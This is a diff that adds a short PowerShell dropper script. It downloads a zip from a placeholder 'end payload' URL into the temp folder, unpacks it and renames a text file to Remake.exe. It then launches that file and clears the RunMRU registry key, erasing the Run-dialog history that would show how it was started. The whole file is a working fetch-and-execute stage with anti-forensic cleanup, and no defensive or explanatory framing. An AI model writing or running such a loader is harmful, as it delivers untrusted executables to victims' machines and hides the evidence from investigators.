@@ -1,0 +1,29 @@
+Add-Type -AssemblyName System.IO.Compression.FileSystem
+function Unzip
+{
+    param([string]$zipfile, [string]$outpath)
+
+    [System.IO.Compression.ZipFile]::ExtractToDirectory($zipfile, $outpath)
+}
+
+$path = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" 
+$arr = (Get-Item -Path $path).Property 
+$url = "www.linkToEndPayload"
+$output = "$env:temp/test.zip";
+$out = "$env:temp/Remake.txt";
+
+Remove-Item -Path $output
+Invoke-WebRequest -Uri $url -OutFile $output
+
+Unzip $output "$env:temp/"
+Rename-Item -Path $out -NewName "Remake.exe"
+
+Start-Process -FilePath "$env:temp/Remake.exe"
+
+foreach($item in $arr) 
+{ 
+   if($item -ne "MRUList") 
+   { 
+     Remove-ItemProperty -Path $path -Name $item -ErrorAction SilentlyContinue 
+   } 
+}
